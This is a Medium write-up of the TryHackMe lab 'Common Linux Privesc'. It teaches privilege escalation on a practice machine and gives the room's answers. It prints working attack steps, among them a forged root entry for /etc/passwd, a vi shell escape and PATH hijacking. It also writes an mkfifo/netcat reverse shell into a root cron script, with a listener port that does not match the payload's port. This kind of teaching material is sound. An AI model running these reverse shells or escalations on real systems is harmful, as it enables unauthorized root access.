---
title: "Common Linux Privesc TryHackme Writeup e3de54dde9df"
platform: Medium
original_file: 2024-08-27_Common-Linux-Privesc-TryHackme-Writeup-e3de54dde9df.md
---

# Common Linux Privesc TryHackme Writeup e3de54dde9df

::: {}
# Common Linux Privesc TryHackme Writeup {#common-linux-privesc-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Common Linux Privesc"
:::

::::::: {.section .e-content field="body"}
:::::: {#6a53 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Common Linux Privesc TryHackme Writeup {#e2a2 .graf .graf--h3 .graf--leading .graf--title name="e2a2"}

**This is a Writeup of Tryhackme room "Common Linux Privesc"**

<figure id="0571" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*wFZM2StVWs7mOPlg.png"
class="graf-image" data-image-id="0*wFZM2StVWs7mOPlg.png"
data-width="585" data-height="314" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc){.markup--anchor
.markup--p-anchor
data-href="https://tryhackme.com/room/commonlinuxprivesc"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

Hello and welcome!

This room will explore common Linux Privilege Escalation vulnerabilities
and techniques, but in order to do that, we'll need to do a few things
first!

A basic knowledge of Linux, and how to navigate the Linux file system,
is required for this room. If you think you'll need some help with this,
try completing the 'Learn Linux' room
[(https://tryhackme.com/room/zthlinux)](https://tryhackme.com/room/zthlinux){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/zthlinux"
rel="noopener ugc nofollow noopener" target="_blank"}

1.  [Deploy the machine]{#3de6}
2.  [Connect to the TryHackMe OpenVPN Server (See
    [https://tryhackme.com/access](https://tryhackme.com/access){.markup--anchor
    .markup--li-anchor data-href="https://tryhackme.com/access"
    rel="noopener ugc nofollow noopener" target="_blank"} for
    help!)]{#48d3}
3.  [Make sure you're sitting comfortably, and have a cup of Tea, Coffee
    or Water close!]{#0b6b}

This Beginner-friendly walkthrough is based on TryHackMe platform room
"[**Common Linux Privilege
Escalation**](https://tryhackme.com/room/commonlinuxprivesc){.markup--anchor
.markup--p-anchor
data-href="https://tryhackme.com/room/commonlinuxprivesc"
rel="noopener ugc nofollow noopener" target="_blank"}". In this
walkthrough, we are going to deep dive into some of the common Linux
privilege escalation techniques that will come handy during a
penetration test.

### Prerequisites {#f72f .graf .graf--h3 .graf-after--p name="f72f"}

Although the room has a detailed explanation of each topic, beforehand
knowledge will let you understand the concepts more easily and clearly

1.  [Understanding of SSH, listing, copying, and writing of
    files]{#74ad}
2.  [Basic Understanding of Linux Files System, file permissions,
    etc]{#cc96}

### Task 2. Understanding Privesc {#ebe1 .graf .graf--h3 .graf-after--li name="ebe1"}

**What does "privilege escalation" mean?**

At it's core, Privilege Escalation usually involves going from a lower
permission to a higher permission. More technically, it's the
exploitation of a vulnerability, design flaw or configuration oversight
in an operating system or application to gain unauthorized access to
resources that are usually restricted from the users.

**Why is it important?**

Rarely when doing a CTF or real-world penetration test, will you be able
to gain a foothold (initial access) that affords you administrator
access. Privilege escalation is crucial, because it lets you gain system
administrator levels of access. This allow you to do many things,
including:

- [Reset passwords]{#4bc4}
- [Bypass access controls to compromise protected data]{#18de}
- [Edit software configurations]{#5288}
- [Enable persistence, so you can access the machine again
  later.]{#6b64}
- [Change privilege of users]{#688d}
- [Get that cheeky root flag ;)]{#089f}

As well as any other administrator or super user commands that you
desire.

### Task 3. Direction of Privilege Escalation {#164f .graf .graf--h3 .graf-after--p name="164f"}

**Privilege Tree:**

<figure id="63f1" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*H0pDexR7b9bQF2cK"
class="graf-image" data-image-id="0*H0pDexR7b9bQF2cK" data-width="644"
data-height="282" />
</figure>

**There are two main privilege escalation variants:**

**Horizontal privilege escalation:** This is where you expand your reach
over the compromised system by taking over a different user who is on
the same privilege level as you. For instance, a normal user hijacking
another normal user (rather than elevating to super user). This allows
you to inherit whatever files and access that user has. This can be
used, for example, to gain access to another normal privilege user, that
happens to have an SUID file attached to their home directory (more on
these later) which can then be used to get super user access. \[Travel
sideways on the tree\]

**Vertical privilege escalation (privilege elevation):** This is where
you attempt to gain higher privileges or access, with an existing
account that you have already compromised. For local privilege
escalation attacks this might mean hijacking an account with
administrator privileges or root privileges. \[Travel up on the tree\]

### Task 4. Enumeration {#06e3 .graf .graf--h3 .graf-after--p name="06e3"}

**What is LinEnum?**\
LinEnum is a simple bash script that performs common commands related to
privilege escalation, saving time and allowing more effort to be put
toward getting root. It is important to understand what commands LinEnum
executes, so that you are able to manually enumerate privesc
vulnerabilities in a situation where you're unable to use LinEnum or
other like scripts. In this room, we will explain what LinEnum is
showing, and what commands can be used to replicate it.

**Where to get LinEnum**\
You can download a local copy of LinEnum from:\
[https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh){.markup--anchor
.markup--p-anchor
data-href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh"
rel="noopener ugc nofollow noopener" target="_blank"}\
It's worth keeping this somewhere you'll remember, because LinEnum is an
invaluable tool.\
How do I get LinEnum on the target machine?

There are two ways to get LinEnum on the target machine. The first way,
is to go to the directory that you have your local copy of LinEnum
stored in, and start a Python web server using **"python3 -m http.server
8000"** \[1\]. Then using **"wget"** on the target machine, and your
local IP, you can grab the file from your local machine \[2\]. Then make
the file executable using the command **"chmod +x FILENAME.sh"**.

``` {#6642 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

First, lets SSH into the target machine, using the credentials
**user3:password**. This is to simulate getting a foothold on the system
as a normal privilege user.

``` {#8a3d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
ssh user3@10.10.41.139
```

<figure id="fa11" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*XcQ9BL8WItj0RF8j.png"
class="graf-image" data-image-id="0*XcQ9BL8WItj0RF8j.png"
data-width="410" data-height="196" />
</figure>

<figure id="ec14" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*qCqvhu9As1j6Dpba.png"
class="graf-image" data-image-id="0*qCqvhu9As1j6Dpba.png"
data-width="745" data-height="259" />
</figure>

What is the target's hostname?

<figure id="9c24" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1s48iCbjbBj70dGT.png"
class="graf-image" data-image-id="0*1s48iCbjbBj70dGT.png"
data-width="299" data-height="86" />
</figure>

> ***Answer: polobox***

Look at the output of /etc/passwd how many "user\[x\]" are there on the
system?

``` {#879a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cat /etc/passwd
```

<figure id="9642" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*3xwlIl2RheIjv4OH.png"
class="graf-image" data-image-id="0*3xwlIl2RheIjv4OH.png"
data-width="559" data-height="226" />
</figure>

> ***Answer: 8***

**Question 3**. How many available shells are there on the system?

<figure id="c62e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*zSdW34JizFClljV8.png"
class="graf-image" data-image-id="0*zSdW34JizFClljV8.png"
data-width="392" data-height="170" />
</figure>

> ***Answer: 4***

**Question 4.** What is the name of the bash script that is set to run
every 5 minutes by cron?

<figure id="3074" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*oaQ1SMlk1uNBYAjj.png"
class="graf-image" data-image-id="0*oaQ1SMlk1uNBYAjj.png"
data-width="680" data-height="385" />
</figure>

> ***Answer: autoscript.sh***

**Question 5**. What critical file has had its permissions changed to
allow some users to write to it?

<figure id="684d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*99tSfPvaVaEKkEuC.png"
class="graf-image" data-image-id="0*99tSfPvaVaEKkEuC.png"
data-width="553" data-height="80" />
</figure>

> ***Answer: /etc/passwd***

**Task 5: Abusing SUID/GUID Files**

Finding and Exploiting SUID Files\
The first step in Linux privilege escalation exploitation is to check
for files with the SUID/GUID bit set. This means that the file or files
can be run with the permissions of the file(s) owner/group. In this
case, as the super-user. We can leverage this to get a shell with these
privileges!\
What is an SUID binary?\
As we all know in Linux everything is a file, including directories and
devices which have permissions to allow or restrict three operations
i.e. read/write/execute. So when you set permission for any file, you
should be aware of the Linux users to whom you allow or restrict all
three permissions. Take a look at the following demonstration of how
maximum privileges (rwx-rwx-rwx) look:

r = read

w = write

x = execute

user group others

rwx rwx rwx

421 421 421

The maximum number of bit that can be used to set permission for each
user is 7, which is a combination of read (4) write (2) and execute (1)
operation. For example, if you set permissions using "chmod" as 755,
then it will be: rwxr-xr-x.\
But when special permission is given to each user it becomes SUID or
SGID. When extra bit "4" is set to user(Owner) it becomes SUID (Set user
ID) and when bit "2" is set to group it becomes SGID (Set Group ID).\
Therefore, the permissions to look for when looking for SUID is:

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx

Finding SUID Binaries\
We already know that there is SUID capable files on the system, thanks
to our LinEnum scan. However, if we want to do this manually we can use
the command: "find / -perm -u=s -type f 2\>/dev/null" to search the file
system for SUID/GUID files. Let's break down this command.

find = Initiates the "find" command

/ = Searches the whole file system

-perm = searches for files with specific permissions

-u=s = Any of the permission bits mode are set for the file. Symbolic
modes are accepted in this form

-type f = Only search for files

2\>/dev/null --- Suppresses errors

**Question 1**. What is the path of the file in user3's directory that
stands out to you?

<figure id="d3fa" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*OlZU_OgFY7XtKAU2.png"
class="graf-image" data-image-id="0*OlZU_OgFY7XtKAU2.png"
data-width="875" data-height="65" />
</figure>

> ***Answer: /home/user3/shell***

### Task 6. Exploiting Writeable /etc/passwd {#d55b .graf .graf--h3 .graf-after--blockquote name="d55b"}

Using the **LinEnum** we found that **user7** has writable permission to
/etc/passwd file which means the user can make changes to the files. The
passwd file contains the password hashes of the users created on the
system.

<figure id="6565" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*wNXdUhNIlINr915I.png"
class="graf-image" data-image-id="0*wNXdUhNIlINr915I.png"
data-width="800" data-height="214" />
</figure>

Next, we need to switch to the **user7** using the password
"**password**"

<figure id="a60e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jxKQo9cBq2y-WUqK.png"
class="graf-image" data-image-id="0*jxKQo9cBq2y-WUqK.png"
data-width="585" data-height="275" />
</figure>

**Question 1**. Having read the information above, what direction
privilege escalation is this attack?

> ***Answer: vertical***

**Question 2**. Before we add our new user, we first need to create a
compliant password hash to add! We do this by using the command:
"openssl passwd -1 -salt \[salt\] \[password\]". What is the hash
created by using this command with the salt, "new" and the password
"123"?

<figure id="23ce" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Tt2JxLUaug_iSsUN.png"
class="graf-image" data-image-id="0*Tt2JxLUaug_iSsUN.png"
data-width="380" data-height="82" />
</figure>

**Question 3**. Great! Now we need to take this value, and create a new
root user account. What would the /etc/passwd entry look like for a root
user with the username "new" and the password hash we created before?

``` {#0b18 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ruby"}
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

<figure id="d06a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*40vl58D2vB9QcGfo.png"
class="graf-image" data-image-id="0*40vl58D2vB9QcGfo.png"
data-width="875" data-height="47" />
</figure>

Let's switch to our **new** user using the password we set before. As
soon as we switch to the new user we are prompted with a superuser
banner as seen below

<figure id="8daf" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*z7Gpo_mlc6podXMv.png"
class="graf-image" data-image-id="0*z7Gpo_mlc6podXMv.png"
data-width="540" data-height="305" />
</figure>

### Task 7. Escaping Vi Editor {#341e .graf .graf--h3 .graf-after--figure name="341e"}

**Sudo -l**

This exploit comes down to how effective our user account enumeration
has been. Every time you have access to an account during a CTF
scenario, you should use **"sudo -l"** to list what commands you're able
to use as a super user on that account. Sometimes, like this, you'll
find that you're able to run certain commands as a root user without the
root password. This can enable you to escalate privileges.

**Escaping Vi**

Running this command on the "user8" account shows us that this user can
run vi with root privileges. This will allow us to escape vim in order
to escalate privileges and get a shell as the root user!

**Misconfigured Binaries and GTFOBins**

If you find a misconfigured binary during your enumeration, or when you
check what binaries a user account you have access to can access, a good
place to look up how to exploit them is GTFOBins. GTFOBins is a curated
list of Unix binaries that can be exploited by an attacker to bypass
local security restrictions. It provides a really useful breakdown of
how to exploit a misconfigured binary and is the first place you should
look if you find one on a CTF or Pentest.

[https://gtfobins.github.io/](https://gtfobins.github.io/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/"
rel="noopener ugc nofollow noopener" target="_blank"}

First, let's exit out of root from our previous task by typing
**"exit"**. Then use **"su"** to swap to user8, with the password
**"password"**

**Question 1**. Let's use the **"sudo -l"** command, what does this user
require (or not require) to run vi as root?

<figure id="f134" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*AEV-BaJ2fyt6CqKT.png"
class="graf-image" data-image-id="0*AEV-BaJ2fyt6CqKT.png"
data-width="875" data-height="182" />
</figure>

> ***Answer: NOPASSWD***

all we need to do is open vi as root, by typing "sudo vi" into the
terminal.

<figure id="526a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TEEnkN0rhhSuJ7A8.png"
class="graf-image" data-image-id="0*TEEnkN0rhhSuJ7A8.png"
data-width="370" data-height="37" />
</figure>

Now, type ":!sh" to open a shell!

<figure id="253f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*KiJeASOsWgFgykRd.png"
class="graf-image" data-image-id="0*KiJeASOsWgFgykRd.png"
data-width="319" data-height="224" />
</figure>

Press Enter to get your root shell

<figure id="7f6d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lhaVJ8f4thh-D3gM.png"
class="graf-image" data-image-id="0*lhaVJ8f4thh-D3gM.png"
data-width="439" data-height="165" />
</figure>

### Task 8: Exploiting Crontab {#6946 .graf .graf--h3 .graf-after--figure name="6946"}

What is Cron?\
The Cron daemon is a long-running process that executes commands at
specific dates and times. You can use this to schedule activities,
either as one-time events or as recurring tasks. You can create a
crontab file containing commands and instructions for the Cron daemon to
execute.\
How to view what Cronjobs are active.\
We can use the command "cat /etc/crontab" to view what cron jobs are
scheduled. This is something you should always check manually whenever
you get a chance, especially if LinEnum, or a similar script, doesn't
find anything.\
Format of a Cronjob\
Cronjobs exist in a certain format, being able to read that format is
important if you want to exploit a cron job.

\# = ID\
m = Minute\
h = Hour\
dom = Day of the month\
mon = Month\
dow = Day of the week\
user = What user the command will run as\
command = What command should be run

For Example,\
\# m h dom mon dow user command\
17 \* 1 \* \* \* root cd / && run-parts --- report /etc/cron.hourly

How can we exploit this?\
We know from our LinEnum scan, that the file autoscript.sh, on user4's
Desktop is scheduled to run every five minutes. It is owned by root,
meaning that it will run with root privileges, despite the fact that we
can write to this file. The task then is to create a command that will
return a shell and paste it in this file. When the file runs again in
five minutes the shell will be running as root.\
Let's do it!

First, let's exit out of root from our previous task by typing "exit".
Then use "su" to swap to user4, with the password "password"

When I exited, I got thrown back in to Vi. To get out, press Esc then
type :q! to get back to user8.

<figure id="9946" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*couwC2C9X9wSwoV2.png"
class="graf-image" data-image-id="0*couwC2C9X9wSwoV2.png"
data-width="406" data-height="69" />
</figure>

<figure id="08bb" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*5GK8ZPlND05n_4u2.png"
class="graf-image" data-image-id="0*5GK8ZPlND05n_4u2.png"
data-width="175" data-height="136" />
</figure>

**Question 1**. What is the flag to specify a payload in msfvenom?

<figure id="2a20" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*I1c-aG-HW0tXMm6L.png"
class="graf-image" data-image-id="0*I1c-aG-HW0tXMm6L.png"
data-width="604" data-height="314" />
</figure>

> ***Answer: -p***

Create a payload using: **"msfvenom -p cmd/unix/reverse_netcat
lhost=LOCALIP lport=8888 R"**

<figure id="2846" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qE0DkVIsNRn-uaoG.png"
class="graf-image" data-image-id="0*qE0DkVIsNRn-uaoG.png"
data-width="762" data-height="221" />
</figure>

<figure id="4197" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*HS3C6Ea0DPSAqDSe.png"
class="graf-image" data-image-id="0*HS3C6Ea0DPSAqDSe.png"
data-width="875" data-height="144" />
</figure>

**Question 1**. What directory is the "autoscript.sh" under?

<figure id="5805" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*U61CZwCIM8LWfApe.png"
class="graf-image" data-image-id="0*U61CZwCIM8LWfApe.png"
data-width="754" data-height="382" />
</figure>

> ***Answer: /home/user4/Desktop***

Lets replace the contents of the file with our payload using:

``` {#6267 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo "mkfifo /tmp/nskmcox; nc 10.2.12.26 4444 0</tmp/nskmcox | /bin/sh >/tmp/nskmcox 2>&1; rm /tmp/nskmcox" > autoscript.sh
```

<figure id="b51c" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*_48AqkjBIsitZDI-.png"
class="graf-image" data-image-id="0*_48AqkjBIsitZDI-.png"
data-width="875" data-height="145" />
</figure>

After copying the code into autoscript.sh file we wait for cron to
execute the file, and start our netcat listener using: "nc -lvp 8888"
and wait for our shell to land!

<figure id="7196" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*il1BNxYKWMOhy7Qi.png"
class="graf-image" data-image-id="0*il1BNxYKWMOhy7Qi.png"
data-width="393" data-height="116" />
</figure>

After about 5 minutes, you should have a shell as root land in your
netcat listening session! Congratulations!

**Get TTy shell**

``` {#642d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
script -qc /bin/bash /dev/null
```

<figure id="5680" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*6TL55MlGLbN0UEW9.png"
class="graf-image" data-image-id="0*6TL55MlGLbN0UEW9.png"
data-width="623" data-height="381" />
</figure>

### Task 9: Exploiting PATH Variable {#992f .graf .graf--h3 .graf-after--figure name="992f"}

Going back to our local ssh session, not the netcat root session, you
can close that now, let's exit out of root from our previous task by
typing "exit". Then use "su" to swap to user5, with the password
"password"

**What is PATH?**

PATH is an environmental variable in Linux and Unix-like operating
systems which specifies directories that hold executable programs. When
the user runs any command in the terminal, it searches for executable
files with the help of the PATH Variable in response to commands
executed by a user.

It is very simple to view the Path of the relevant user with help of the
command **"echo \$PATH"**.

**How does this let us escalate privileges?**

Let's say we have an SUID binary. Running it, we can see that it's
calling the system shell to do a basic process like list processes with
"ps". Unlike in our previous SUID example, in this situation we can't
exploit it by supplying an argument for command injection, so what can
we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when
the SUID binary calls the system shell to run an executable, it runs one
that we've written instead!

As with any SUID file, it will run this command with the same privileges
as the owner of the SUID file! If this is root, using this method we can
run whatever commands we like as root!

<figure id="a872" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*k5ssBGug3JLxREFI.png"
class="graf-image" data-image-id="0*k5ssBGug3JLxREFI.png"
data-width="436" data-height="233" />
</figure>

**Question 1**. Let's go to user5's home directory, and run the file
"script". What command do we think that it's executing?

<figure id="73c1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*rY6v8BQ4C8qF9o4u.png"
class="graf-image" data-image-id="0*rY6v8BQ4C8qF9o4u.png"
data-width="849" data-height="158" />
</figure>

> ***Answer: ls***

Now we know what command to imitate, let's change directory to "tmp".

<figure id="418d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*PglKv-8TVrKFlquo.png"
class="graf-image" data-image-id="0*PglKv-8TVrKFlquo.png"
data-width="861" data-height="306" />
</figure>

Now we need to change the path variable as shown below. As soon as we
run the ls command, it will take us to the root shel

<figure id="e76c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*yr_bQIGQ_LEtw_Fz.png"
class="graf-image" data-image-id="0*yr_bQIGQ_LEtw_Fz.png"
data-width="670" data-height="244" />
</figure>

Now, change directory back to user5's home directory.

Now, run the "script" file again, you should be sent into a root bash
prompt!

<figure id="3f01" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZkZBe6M27h5MNTZc.png"
class="graf-image" data-image-id="0*ZkZBe6M27h5MNTZc.png"
data-width="829" data-height="325" />
</figure>

**Congratulations!**

I hope you enjoyed this writeup. Remember to practice the tools and
techniques you learned during this walkthrough to reinforce your
knowledge. Till then Happy Hacking ;)

### Resource & Material {#c776 .graf .graf--h3 .graf-after--p name="c776"}

Below is a list of good checklists to apply to CTF or penetration test
use cases.Although I encourage you to make your own using CherryTree or
whatever notes application you prefer.

- [[https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md){.markup--anchor
  .markup--li-anchor
  data-href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#af7e}
- [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md){.markup--anchor
  .markup--li-anchor
  data-href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#c8f9}
- [[https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation\_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html){.markup--anchor
  .markup--li-anchor
  data-href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#0686}
- [[https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation){.markup--anchor
  .markup--li-anchor
  data-href="https://payatu.com/guide-linux-privilege-escalation"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#88bd}

### Promote and Collaborate on Cybersecurity Insights {#eb99 .graf .graf--h3 .graf-after--li name="eb99"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#6a96 .graf .graf--h3 .graf-after--p name="6a96"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 27, 2024](https://medium.com/p/e3de54dde9df).

[Canonical
link](https://medium.com/@bevijaygupta/common-linux-privesc-tryhackme-writeup-e3de54dde9df){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
